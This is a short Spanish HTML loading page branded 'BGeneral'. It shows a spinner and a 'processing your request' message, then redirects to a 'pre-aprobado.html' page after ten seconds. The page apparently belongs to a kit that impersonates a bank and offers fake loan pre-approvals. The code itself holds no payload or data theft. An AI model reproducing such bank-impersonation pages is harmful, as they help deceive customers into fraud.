<html lang="es"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando - BGeneral</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: Poppins, Helvetica, Arial, sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 0;
            position: relative;
            overflow: hidden; /* Para ocultar cualquier desbordamiento */
        }

        .loading-container {
            background-color: #004C97;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
            text-align: center;
            z-index: 1; /* Asegura que el contenedor esté por encima de otros elementos */
            position: relative; /* Necesario para el z-index */
            color: #fff;
        }

        .loading-image {
            width: 100px; /* Ajusta el tamaño de la imagen según sea necesario */
            margin-bottom: 20px; /* Espacio entre la imagen y el spinner */
        }

        .loading-spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 8px solid #feb236; /* Color del spinner */
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite; /* Animación de giro */
            margin: 20px auto; /* Centra el spinner */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 18px;
            margin-top: 20px;
        }

        .container img {
    width: 100px;
    margin-bottom: 20px;
    border-radius: 50%;
    border: 3px solid #feb236;
}
    </style>

    
</head>
<body>

    <div class="loading-container">
        <img src="logoredondo.png" alt="Logo BNC" class="loading-image img" style="
    width: 100px;
    margin-bottom: 20px;
    border-radius: 50%;
    border: 3px solid #fff;
"> <!-- Cambia a la URL de tu imagen -->
        <div class="loading-spinner"></div>
        <div class="loading-text">Procesando la solicitud, por favor espere...</div>
    </div>

    <script>
        // Simular un tiempo de carga de 3 segundos antes de redirigir
        setTimeout(() => {
            window.location.href = "pre-aprobado.html"; // Redirección a la página de pre-aprobación
        }, 10000); // Cambia 3000 por el tiempo deseado en milisegundos
    </script>



</body></html>
